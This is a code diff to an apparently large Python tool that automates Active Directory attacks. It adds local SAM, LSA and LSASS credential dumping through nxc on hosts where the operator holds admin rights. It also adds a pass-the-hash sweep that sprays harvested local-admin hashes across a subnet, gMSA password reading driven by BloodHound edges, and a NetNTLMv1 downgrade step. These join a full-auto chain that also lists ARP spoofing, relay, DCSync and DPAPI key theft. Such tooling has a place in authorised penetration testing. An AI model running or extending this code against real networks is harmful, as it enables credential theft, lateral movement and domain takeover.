     # --- timeroast: lines like "TIMEROAST ... <rid>:$sntp-ms$<hash>"
     timeroast_text = _read("timeroast")
@@ -7162,6 +7815,7 @@ def _bh_auto_action(edges: list[dict], cfg: Config):
     Maps edge (right, target_type) → primitive:
       WriteSPN              → try_ghost_spn_upgrade   (CVE-2025-58726-style)
       AddKeyCredentialLink  → run_shadow_credentials  (PKINIT pre-auth)
+      ReadGMSAPassword      → run_gmsa_read           (managed password → NT)
       GenericAll/Write* on Computer → run_rbcd_attack (RBCD impersonation)
 
     De-duplicates by (action, target) so the same target isn't hit twice.
@@ -7195,6 +7849,8 @@ def _bh_auto_action(edges: list[dict], cfg: Config):
                 try_ghost_spn_upgrade(sam, cfg)
             elif action == "shadow_creds":
                 run_shadow_credentials(sam, cfg)
+            elif action == "gmsa_read":
+                run_gmsa_read(sam, cfg)
             elif action == "rbcd":
                 run_rbcd_attack(sam, cfg)
         except Exception as ex:
@@ -7226,12 +7882,19 @@ _LOOT_SECRET_PATTERNS = [
 
 def _loot_get_targets(cfg: Config) -> list[str]:
     """Pick up to 10 hosts to loot. Priority: explicit target → exploit-succeeded
-    hosts (working-method-*.txt) → high-value targets → relay targets."""
+    hosts (working-method-*.txt) → BloodHound AdminTo hosts → high-value
+    targets → relay targets → PtH-reuse hosts. AdminTo hosts are included
+    because that is exactly where a local SAM/LSA dump will succeed."""
     if cfg.specific_target:
         return [cfg.specific_target]
     targets: list[str] = []
     for f in cfg.work_dir.glob("working-method-*.txt"):
         targets.append(f.stem.replace("working-method-", ""))
+    # Hosts where our principal is a local admin (from BloodHound) — prime
+    # SAM/LSA dump candidates even if we never "exploited" them explicitly.
+    admin_to = cfg.work_dir / "admin-to-hosts.txt"
+    if admin_to.exists():
+        targets.extend([l.strip() for l in admin_to.read_text().splitlines() if l.strip()])
     if not targets:
         hv = cfg.work_dir / "high-value-targets.txt"
         if hv.exists():
@@ -7240,6 +7903,10 @@ def _loot_get_targets(cfg: Config) -> list[str]:
         rt = cfg.work_dir / "relay-targets.txt"
         if rt.exists():
             targets.extend([l.strip() for l in rt.read_text().splitlines() if l.strip()])
+    # Hosts a prior PtH-reuse sweep pwned — re-loot them for fresh secrets
+    reuse = cfg.work_dir / "pth-reuse-hosts.txt"
+    if reuse.exists():
+        targets.extend([l.strip() for l in reuse.read_text().splitlines() if l.strip()])
     seen: set[str] = set()
     out: list[str] = []
     for t in targets:
@@ -7405,10 +8072,229 @@ def _loot_keepass(host: str, cfg: Config) -> int:
     return cracked_count
 
 
+def _parse_local_secrets(text: str) -> tuple[list[tuple[str, str, str]], list[str]]:
+    """Split nxc --sam/--lsa output into (sam_entries, lsa_lines).
+
+    sam_entries: (account, rid, nt_hash) from SAM rows 'name:rid:lm:nt:::'.
+                 RID is kept because the built-in admin is often renamed
+                 (GOAD's RID-500 is 'goadmin', not 'Administrator'), and the
+                 PtH-reuse sweep keys on RID 500, not the name.
+    lsa_lines: raw LSA-secret / cached-cred lines worth keeping
+               (DCC2 cached domain creds, DefaultPassword, _SC_ service
+               account creds, dpapi machine/user keys, NL$KM, etc.)."""
+    sam_entries: list[tuple[str, str, str]] = []
+    lsa_lines: list[str] = []
+    seen: set[str] = set()
+    # SAM row: Administrator:500:aad3b435...:<nt>:::  — anchor the account to a
+    # line-start/space boundary and forbid spaces/colons in it so the nxc line
+    # prefix ("SMB  host  port  NAME  ") is NOT captured into the account name.
+    sam_re = re.compile(
+        r"(?:^|\s)([^\s:]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::")
+    lsa_markers = ("$DCC2$", "DefaultPassword", "dpapi_", "NL$KM",
+                   "_SC_", "$MACHINE.ACC")
+    plaintext_re = re.compile(r"[^\s:]+\\[^\s:]+:\S{2,}")   # domain\user:secret
+    status_tokens = ("[+]", "[*]", "[-]", "[!]", "Pwn3d!", "Dumping",
+                     "Getting", "Target")
+    for line in text.splitlines():
+        sm = sam_re.search(line)
+        if sm:
+            acct, rid, nt = sm.group(1).strip(), sm.group(2), sm.group(4).lower()
+            key = f"{acct.lower()}:{rid}:{nt}"
+            if key not in seen:
+                seen.add(key)
+                sam_entries.append((acct, rid, nt))
+            continue
+        # trim the nxc protocol prefix ("SMB host port NAME  ") if present
+        trimmed = re.sub(r"^\s*SMB\s+\S+\s+\d+\s+\S+\s+", "", line).strip()
+        is_status = any(tok in line for tok in status_tokens)
+        hit = any(mk in line for mk in lsa_markers)
+        # Plaintext LSA creds (domain\user:secret) — but not the nxc status /
+        # auth lines that share the domain\user:pass shape.
+        if not hit and not is_status and plaintext_re.search(trimmed):
+            hit = True
+        if hit and trimmed and trimmed not in lsa_lines:
+            lsa_lines.append(trimmed)
+    return sam_entries, lsa_lines
+
+
+def _loot_local_secrets(host: str, cfg: Config) -> int:
+    """Dump local SAM + LSA secrets on a host where we hold admin.
+
+    Mirrors `secretsdump -sam -lsa` but via nxc (uniform PtH/password auth
+    and it self-detects admin via the Pwn3d marker). Harvested local NT
+    hashes are recorded to loot-harvested-hashes.txt so the PtH reuse sweep
+    can turn one admin foothold into many. Returns count of creds harvested."""
+    if not tool_exists("nxc"):
+        return 0
+    out_file = cfg.work_dir / f"loot-localsecrets-{host}.txt"
+    auth = _nxc_auth_args(cfg)
+    cmd = ["nxc", "smb", host] + auth + ["--sam", "--lsa"]
+    log.info(f"🗝️  local SAM+LSA dump on {host}")
+    result = run(cmd, cfg, timeout=180, outfile=out_file)
+    if cfg.dry_run:
+        return 0
+    text = out_file.read_text(errors="replace") if out_file.exists() else (result.stdout or "")
+
+    if "Pwn3d!" not in text and ":::" not in text:
+        detail(f"No local-admin on {host} (SAM/LSA dump skipped)")
+        return 0
+
+    sam_entries, lsa_lines = _parse_local_secrets(text)
+    harvested = 0
+
+    if sam_entries:
+        ok(f"🗝️  {host}: {len(sam_entries)} local SAM hash(es)")
+        # Tag each SAM account host-locally so PtH sweep knows it's --local-auth
+        local_pairs = [(f"{acct}@{host}", nt) for acct, _rid, nt in sam_entries]
+        _record_machine_hashes(cfg, local_pairs, source=f"sam:{host}")
+        for acct, rid, nt in sam_entries[:6]:
+            detail(f"{acct} (rid {rid}) → NT:{nt}")
+        harvested += len(sam_entries)
+        # Persist RID-500 built-in admin(s) as PtH-reuse sweep candidates
+        _record_local_admins(cfg, host, sam_entries)
+
+    if lsa_lines:
+        ok(f"🔐 {host}: {len(lsa_lines)} LSA secret line(s) (cached creds / service acct / DPAPI)")
+        for ln in lsa_lines[:5]:
+            detail(ln[:160])
+        harvested += len(lsa_lines)
+
+    # Optional: LSASS via lsassy module for plaintext / live-session creds
+    if tool_exists("nxc") and _tool_module_available("lsassy"):
+        lsass_out = cfg.work_dir / f"loot-lsass-{host}.txt"
+        run(["nxc", "smb", host] + auth + ["-M", "lsassy"],
+            cfg, timeout=180, outfile=lsass_out)
+        if lsass_out.exists():
+            live = _parse_local_secrets(lsass_out.read_text(errors="replace"))[0]
+            if live:
+                ok(f"🧠 {host}: {len(live)} LSASS credential(s)")
+                _record_machine_hashes(cfg, [(f"{a}@{host}", h) for a, _r, h in live],
+                                       source=f"lsass:{host}")
+                harvested += len(live)
+
+    return harvested
+
+
+def _record_local_admins(cfg: Config, host: str, sam_entries: list) -> None:
+    """Append RID-500 built-in admins (whatever their name — GOAD renames RID
+    500 to 'goadmin') plus any literal 'Administrator' account to
+    loot-local-admins.txt as account<TAB>nt<TAB>host, deduped by (account,nt).
+    This is the reuse-candidate feed for _pth_reuse_sweep."""
+    cands: list[tuple[str, str]] = []
+    for acct, rid, nt in sam_entries:
+        if nt.lower() == _BLANK_NT:
+            continue
+        if rid == "500" or acct.lower() == "administrator":
+            cands.append((acct, nt.lower()))
+    if not cands:
+        return
+    f = cfg.work_dir / "loot-local-admins.txt"
+    existing: set[tuple[str, str]] = set()
+    rows: list[str] = []
+    if f.exists():
+        for ln in f.read_text(errors="replace").splitlines():
+            p = ln.split("\t")
+            if len(p) >= 2:
+                existing.add((p[0].lower(), p[1].lower()))
+                rows.append(ln)
+    for acct, nt in cands:
+        if (acct.lower(), nt) in existing:
+            continue
+        existing.add((acct.lower(), nt))
+        rows.append(f"{acct}\t{nt}\t{host}")
+    f.write_text("\n".join(rows) + "\n")
+
+
+# Cache for module availability so we don't re-shell `nxc -L` per host
+_NXC_MODULE_CACHE: dict[str, bool] = {}
+
+
+def _tool_module_available(module: str) -> bool:
+    """Best-effort check whether an nxc module (e.g. lsassy) is installed.
+    Cached; returns True optimistically if the listing can't be produced."""
+    if module in _NXC_MODULE_CACHE:
+        return _NXC_MODULE_CACHE[module]
+    if not tool_exists("nxc"):
+        _NXC_MODULE_CACHE[module] = False
+        return False
+    try:
+        res = subprocess.run(["nxc", "smb", "-L"], capture_output=True,
+                             text=True, timeout=30)
+        listing = (res.stdout or "") + (res.stderr or "")
+        avail = (module.lower() in listing.lower()) if listing.strip() else True
+    except Exception:
+        avail = True  # don't block the dump path on a listing hiccup
+    _NXC_MODULE_CACHE[module] = avail
+    return avail
+
+
+def _load_local_admin_candidates(cfg: Config) -> list[tuple[str, str]]:
+    """(account, nt_hash) reuse candidates from loot-local-admins.txt — the
+    RID-500 built-in admins harvested from SAM dumps. Deduped by nt hash so we
+    spray each distinct local-admin password once."""
+    f = cfg.work_dir / "loot-local-admins.txt"
+    if not f.exists():
+        return []
+    out: list[tuple[str, str]] = []
+    seen: set[str] = set()
+    for ln in f.read_text(errors="replace").splitlines():
+        p = ln.split("\t")
+        if len(p) < 2:
+            continue
+        acct, nt = p[0], p[1].lower()
+        if nt == _BLANK_NT or nt in seen:
+            continue
+        seen.add(nt)
+        out.append((acct, nt))
+    return out
+
+
+def _pth_reuse_sweep(cfg: Config) -> int:
+    """Pass-the-hash reuse sweep: take each harvested RID-500 local-admin NT
+    hash and spray it (--local-auth, with the account's real name) across the
+    subnet to find hosts sharing that local password — the classic
+    'one foothold → many' pivot. Writes loot-pth-reuse.txt. Returns number of
+    newly-pwned hosts."""
+    admins = _load_local_admin_candidates(cfg)
+    if not admins:
+        return 0
+    subnet = cfg.target_net or cfg.specific_target or cfg.dc_ip
+    if not subnet or not tool_exists("nxc"):
+        return 0
+
+    log.info(f"🔁 PtH reuse sweep: {len(admins)} local-admin hash(es) → {subnet}")
+    reuse_file = cfg.work_dir / "loot-pth-reuse.txt"
+    pwned: list[str] = []
+    for acct, nt in admins:
+        out_file = cfg.work_dir / f"loot-pth-{nt[:8]}.txt"
+        cmd = ["nxc", "smb", subnet, "-u", acct, "-H", nt, "--local-auth"]
+        result = run(cmd, cfg, timeout=300, outfile=out_file)
+        if cfg.dry_run:
+            continue
+        text = out_file.read_text(errors="replace") if out_file.exists() else (result.stdout or "")
+        for line in text.splitlines():
+            if "Pwn3d!" in line:
+                m = re.search(r"SMB\s+(\S+)\s+\d+\s+(\S+)", line)
+                if m:
+                    ip, name = m.group(1), m.group(2)
+                    entry = f"{ip}\t{name}\t{acct}:{nt}"
+                    if entry not in pwned:
+                        pwned.append(entry)
+                        detail(f"💀 PtH reuse: {name} ({ip}) — local {acct} hash valid")
+    if pwned:
+        reuse_file.write_text("\n".join(pwned) + "\n")
+        ok(f"🔁 PtH reuse: {len(pwned)} additional host(s) share a local-admin hash")
+        # Feed newly-pwned hosts back in as loot targets for the next pass
+        newhosts = cfg.work_dir / "pth-reuse-hosts.txt"
+        newhosts.write_text("\n".join(sorted({e.split(chr(9))[0] for e in pwned})) + "\n")
+    return len(pwned)
+
+
 def run_loot(cfg: Config) -> bool:
-    """Loot phase: process-cmdline harvest + KeePass discovery/crack across
-    compromised / high-value / relay-target hosts."""
-    phase_header("LOOT — process cmdlines + KeePass vaults")
+    """Loot phase: local SAM/LSA/LSASS dump + PtH reuse pivot + process-cmdline
+    harvest + KeePass discovery/crack across compromised / high-value /
+    relay-target / AdminTo hosts."""
+    phase_header("LOOT — local secrets + cmdlines + KeePass vaults")
 
     if not cfg.has_creds:
         log.warning("Loot phase needs creds — skipping")
@@ -7416,7 +8302,7 @@ def run_loot(cfg: Config) -> bool:
 
     targets = _loot_get_targets(cfg)
     if not targets:
-        log.warning("No loot targets (no compromised/HV/relay-target hosts known yet)")
+        log.warning("No loot targets (no compromised/HV/relay-target/AdminTo hosts known yet)")
         return False
 
     log.info(f"Looting {len(targets)} host(s): {', '.join(targets[:5])}"
@@ -7424,15 +8310,26 @@ def run_loot(cfg: Config) -> bool:
 
     total_secrets = 0
     total_kdbx = 0
+    total_local = 0
     for host in targets:
         try:
+            total_local += _loot_local_secrets(host, cfg)
             total_secrets += _loot_processes(host, cfg)
             total_kdbx += _loot_keepass(host, cfg)
         except Exception as ex:
             log.warning(f"Loot crashed on {host}: {ex}")
 
-    if total_secrets or total_kdbx:
-        ok(f"Loot summary: {total_secrets} cmdline secret(s), {total_kdbx} KeePass cracked")
+    # Turn harvested local-admin hashes into lateral movement across the subnet
+    reused = 0
+    try:
+        reused = _pth_reuse_sweep(cfg)
+    except Exception as ex:
+        log.warning(f"PtH reuse sweep crashed: {ex}")
+
+    if total_secrets or total_kdbx or total_local or reused:
+        ok(f"Loot summary: {total_local} local secret(s), "
+           f"{total_secrets} cmdline secret(s), {total_kdbx} KeePass cracked, "
+           f"{reused} PtH-reuse host(s)")
         return True
     detail("Loot: no secrets harvested")
     return False
@@ -7511,7 +8408,7 @@ def _bh_name_to_sam(bh_name: str, obj_type: str) -> str:
 _BH_INTERESTING_RIGHTS = {
     "WriteSPN", "AddKeyCredentialLink", "GenericAll", "GenericWrite",
     "WriteDacl", "WriteOwner", "WriteAccountRestrictions", "AddAllowedToAct",
-    "ForceChangePassword", "AllExtendedRights", "Owns",
+    "ForceChangePassword", "AllExtendedRights", "Owns", "ReadGMSAPassword",
 }
 
 # (right, target_object_type) → action handler used by auto-action below
@@ -7520,6 +8417,8 @@ _BH_AUTO_ACTION_MAP: dict[tuple[str, str], str] = {
     ("WriteSPN",                   "User"):     "ghost_spn",
     ("AddKeyCredentialLink",       "Computer"): "shadow_creds",
     ("AddKeyCredentialLink",       "User"):     "shadow_creds",
+    ("ReadGMSAPassword",           "User"):     "gmsa_read",
+    ("ReadGMSAPassword",           "Computer"): "gmsa_read",
     ("GenericAll",                 "Computer"): "rbcd",
     ("GenericWrite",               "Computer"): "rbcd",
     ("WriteAccountRestrictions",   "Computer"): "rbcd",
@@ -7574,6 +8473,7 @@ def analyze_bloodhound_data(zip_path: Optional[Path], cfg: Config,
         "admincount_users": [],
         "disabled_admins": [],
         "pwd_never_expires_admins": [],
+        "admin_to": [],
     }
 
     # --- Users ---
@@ -7646,6 +8546,35 @@ def analyze_bloodhound_data(zip_path: Optional[Path], cfg: Config,
                   "edges will still be evaluated")
     controlled = _bh_controlled_principals(our_sid, groups)
 
+    # --- AdminTo: computers where a principal WE control sits in the local
+    # Administrators group. These are prime SAM/LSA/LSASS dump targets — the
+    # loot phase pulls admin-to-hosts.txt so `secretsdump -sam -lsa` lands on
+    # exactly the hosts where we already hold local admin. Schema-tolerant:
+    # bloodhound-python/SharpHound expose either LocalAdmins.Results or the
+    # newer LocalGroups[].Results shape.
+    admin_to_hosts: list[str] = []
+    for c in computers:
+        cname = c.get("Properties", {}).get("name", "")
+        if not cname:
+            continue
+        member_sids: list[str] = []
+        la = c.get("LocalAdmins")
+        if isinstance(la, dict):
+            member_sids += [m.get("ObjectIdentifier", "")
+                            for m in la.get("Results", [])]
+        for grp in c.get("LocalGroups", []) or []:
+            if "admin" in str(grp.get("Name", "")).lower():
+                member_sids += [m.get("ObjectIdentifier", "")
+                                for m in grp.get("Results", [])]
+        if any(sid in controlled for sid in member_sids if sid):
+            admin_to_hosts.append(cname)
+    admin_to_hosts = list(dict.fromkeys(admin_to_hosts))
+    findings["admin_to"] = admin_to_hosts
+    if admin_to_hosts:
+        # Write DNS host names so the loot/PtH phases can target them directly
+        (cfg.work_dir / "admin-to-hosts.txt").write_text(
+            "\n".join(admin_to_hosts) + "\n")
+
     actionable_edges: list[dict] = []
     # Tag each object with its type so we know how to use the edge later
     typed_objects = (
@@ -7684,6 +8613,7 @@ def analyze_bloodhound_data(zip_path: Optional[Path], cfg: Config,
         ("constrained_delegation",   "⚠️  Constrained delegation (allowedtodelegate)"),
         ("rbcd_inbound",             "🎟️  RBCD inbound (AllowedToAct)"),
         ("laps_computers",           "🔐 LAPS-enabled computers"),
+        ("admin_to",                 "🗝️  AdminTo (local admin — SAM/LSA dump targets)"),
         ("admincount_users",         "🛡️  AdminCount=1 users"),
         ("disabled_admins",          "💤 Disabled admin accounts"),
         ("pwd_never_expires_admins", "⏳ Admins with pwdneverexpires"),
@@ -7741,6 +8671,10 @@ def analyze_bloodhound_data(zip_path: Optional[Path], cfg: Config,
         ok(f"🐶 RBCD inbound: {len(findings['rbcd_inbound'])} edge(s)")
     if findings["laps_computers"]:
         ok(f"🐶 LAPS-readable candidates: {len(findings['laps_computers'])}")
+    if findings["admin_to"]:
+        ok(f"🐶 AdminTo (local admin) on {len(findings['admin_to'])} host(s) → SAM/LSA loot")
+        for h in findings["admin_to"][:5]:
+            detail(h)
 
     detail(f"Full analysis: {out_file}")
 
@@ -7778,13 +8712,14 @@ def run_full_auto(cfg: Config):
     detail("0️⃣   Passive sniff — detect WPAD/WSUS/PXE/LLMNR/DHCPv6 traffic")
     detail("1-3  ARP spoof → WPAD poisoning → WSUS relay → PXE theft")
     detail("4️⃣   NTLM theft file drops (.library-ms/.theme on shares)")
-    detail("4.5  nxc enrichment + BloodHound -c All (graph analysis) 🐶")
+    detail("4.5  nxc enrichment (gMSA/LAPS/timeroast) + BloodHound -c All 🐶")
     detail("5️⃣   Kerberoast + AS-REP Roast (credential harvest)")
     detail("6️⃣   AD CS — ESC1-17 detection (Certihound) / ESC1-16 exploit (certipy)")
     detail("7️⃣   SCCM NAA credential theft (sccmhunter)")
-    detail("8️⃣   Enumerate targets + exploit (Shadow Creds / RBCD)")
+    detail("8️⃣   Enumerate targets + exploit (Shadow Creds / RBCD / gMSA)")
     detail("9️⃣   WSUS update injection (AppLocker bypass)")
-    detail("🔟  DCSync + DPAPI backup key extraction 👑")
+    detail("🔟  DCSync + NetNTLMv1 downgrade + DPAPI backup key 👑")
+    detail("1️⃣1️⃣  Loot — local SAM/LSA/LSASS dump + PtH reuse pivot 💰")
     print()
 
     # Step 0: Passive sniff to discover viable attacks (auto-fills DC/domain)
@@ -7981,6 +8916,16 @@ def run_full_auto(cfg: Config):
     if not cfg.no_dcsync:
         dcsync_attack(best_target or cfg.dc_ip, cfg)
 
+    # Step 10a: NetNTLMv1 downgrade → machine hash → DCSync/self-takeover.
+    # Full-auto always runs as root with a listener IP, so this is a pure
+    # opt-out (--no-ntlmv1). Signing-independent path that lands even where
+    # SMB signing blocks the NTLMv2 relay attempts above.
+    if not cfg.no_ntlmv1:
+        try:
+            run_ntlmv1_downgrade(cfg)
+        except Exception as e:
+            log.warning(f"NetNTLMv1 downgrade crashed: {e}")
+
     # Step 10b: DPAPI backup key extraction (post-DCSync goldmine)
     if not cfg.no_dpapi:
         run_dpapi_backup(cfg)
@@ -8124,6 +9069,12 @@ def print_summary(cfg: Config):
         n = len(enrich_timeroast_cracked.read_text().strip().splitlines())
         stats.append(("⏰ Timeroast:", f"{C.BOLD_GREEN}{n} cracked{C.NC}"))
 
+    # gMSA managed passwords → NT hashes
+    enrich_gmsa = cfg.work_dir / "enrich-gmsa.txt"
+    if enrich_gmsa.exists() and enrich_gmsa.stat().st_size > 0:
+        n = len([l for l in enrich_gmsa.read_text().splitlines() if l.strip()])
+        stats.append(("💎 gMSA hashes:", f"{C.BOLD_GREEN}{n} read{C.NC}"))
+
     # BloodHound analysis
     bh_analysis = cfg.work_dir / "bloodhound-analysis.txt"
     if bh_analysis.exists():
@@ -8150,6 +9101,35 @@ def print_summary(cfg: Config):
     )
     if kdbx_cracked:
         stats.append(("💎 KeePass cracked:", f"{C.BOLD_GREEN}{kdbx_cracked} vault(s){C.NC}"))
+
+    # Local SAM/LSA/LSASS dumps + PtH reuse pivot
+    local_dumped = sum(
+        1 for f in cfg.work_dir.glob("loot-localsecrets-*.txt")
+        if f.exists() and ":::" in f.read_text(errors="replace")
+    )
+    if local_dumped:
+        stats.append(("🗝️  Local secrets:", f"{C.BOLD_GREEN}{local_dumped} host(s){C.NC}"))
+    harvested = cfg.work_dir / "loot-harvested-hashes.txt"
+    if harvested.exists():
+        n = len([l for l in harvested.read_text().splitlines() if l.strip()])
+        if n:
+            stats.append(("🔑 Harvested hashes:", f"{C.BOLD_GREEN}{n}{C.NC}"))
+    pth_reuse = cfg.work_dir / "loot-pth-reuse.txt"
+    if pth_reuse.exists() and pth_reuse.stat().st_size > 0:
+        n = len([l for l in pth_reuse.read_text().splitlines() if l.strip()])
+        stats.append(("🔁 PtH reuse:", f"{C.BOLD_RED}{n} host(s) pivoted{C.NC}"))
+
+    # NetNTLMv1 downgrade
+    ntlmv1_hashes = cfg.work_dir / "ntlmv1-hashes.txt"
+    if ntlmv1_hashes.exists() and ntlmv1_hashes.stat().st_size > 0:
+        n = len([l for l in ntlmv1_hashes.read_text().splitlines() if l.strip()])
+        stats.append(("🎣 NetNTLMv1:", f"{C.BOLD_YELLOW}{n} captured → crack.sh{C.NC}"))
+
+    # AdminTo (BloodHound local-admin) hosts
+    admin_to = cfg.work_dir / "admin-to-hosts.txt"
+    if admin_to.exists() and admin_to.stat().st_size > 0:
+        n = len([l for l in admin_to.read_text().splitlines() if l.strip()])
+        stats.append(("🗝️  AdminTo hosts:", f"{C.BOLD_YELLOW}{n}{C.NC}"))
 
     # WebDAV coercion
     webdav_relay = cfg.work_dir / "webdav-relay.txt"
@@ -8341,6 +9321,10 @@ def parse_args() -> Config:
     adv.add_argument("--no-rbcd", action="store_true", help="Skip RBCD delegation abuse")
     adv.add_argument("--machine-account", default="", help="Pre-created machine account for RBCD")
     adv.add_argument("--machine-password", default="", help="Machine account password for RBCD")
+    adv.add_argument("--no-ntlmv1", action="store_true",
+                     help="Skip NetNTLMv1 downgrade attack in full auto")
+    adv.add_argument("--ntlmv1-nthash", default="",
+                     help="Fast-path chain a crack.sh-recovered hash: 'ACCOUNT$:<32-hex-nthash>'")
     adv.add_argument("--alt-spn", default="",
                      help="Alternate SPN (service/host) — passes -altservice to "
                           "impacket-getST and rewrites the issued TGS sname "
@@ -8386,7 +9370,7 @@ def parse_args() -> Config:
                           choices=["full", "enum", "exploit", "dcsync", "arp", "wpad", "wsus",
                                    "pxe", "sniff", "adcs", "roast", "sccm", "enrich", "discover",
                                    "bloodhound", "tgs-rewrite", "loot",
-                                   "dollar-ticket", "rbcd-kcd",
+                                   "dollar-ticket", "rbcd-kcd", "ntlmv1", "gmsa",
                                    "reflect-tcpport", "reflect-loopback", "kerb-reflect"],
                           help="Run a single phase")
     run_opts.add_argument("--dry-run", action="store_true", help="Print commands only")
@@ -8439,6 +9423,8 @@ def parse_args() -> Config:
         no_rbcd=args.no_rbcd,
         machine_account=args.machine_account,
         machine_password=args.machine_password,
+        no_ntlmv1=args.no_ntlmv1,
+        ntlmv1_nthash=args.ntlmv1_nthash,
         alt_spn=args.alt_spn,
         in_ccache=args.in_ccache,
         target_user=args.target_user,
@@ -8647,6 +9633,25 @@ def main():
                     sys.exit(1)
                 run_rbcd_kcd_chain(cfg)
 
+            case "ntlmv1":
+                # Fast-path (--ntlmv1-nthash) works creds-free; live capture
+                # needs creds to drive coercion + root for Responder.
+                if not cfg.ntlmv1_nthash and not cfg.has_creds:
+                    log.error("--phase ntlmv1 needs -u/-p (to coerce) "
+                              "or --ntlmv1-nthash to chain a recovered hash")
+                    sys.exit(1)
+                run_ntlmv1_downgrade(cfg)
+
+            case "gmsa":
+                if not cfg.has_creds:
+                    log.error("--phase gmsa requires credentials (-u/-p)")
+                    sys.exit(1)
+                tgt = cfg.specific_target or cfg.target_user
+                if not tgt:
+                    log.error("--phase gmsa needs -T <gmsa_account> (or --target-user)")
+                    sys.exit(1)
+                run_gmsa_read(tgt, cfg)
+
             case "discover":
                 # Zero-auth: no -u/-p needed, but cfg.dc_ip + cfg.domain
                 # must be auto-discoverable from the network or supplied.
@@ -8740,6 +9745,15 @@ def main():
 
                     if not cfg.no_dcsync and best:
                         dcsync_attack(best, cfg)
+
+                # NetNTLMv1 downgrade → machine hash → DCSync / self-takeover.
+                # Live capture needs root (Responder) + a listener IP; the
+                # --ntlmv1-nthash fast-path chains without either. Gate so the
+                # common non-root authenticated run stays quiet.
+                if not cfg.no_ntlmv1 and (
+                    cfg.ntlmv1_nthash or (cfg.attacker_ip and os.geteuid() == 0)
+                ):
+                    run_ntlmv1_downgrade(cfg)
 
                 # DPAPI extraction after DCSync
                 if not cfg.no_dpapi:
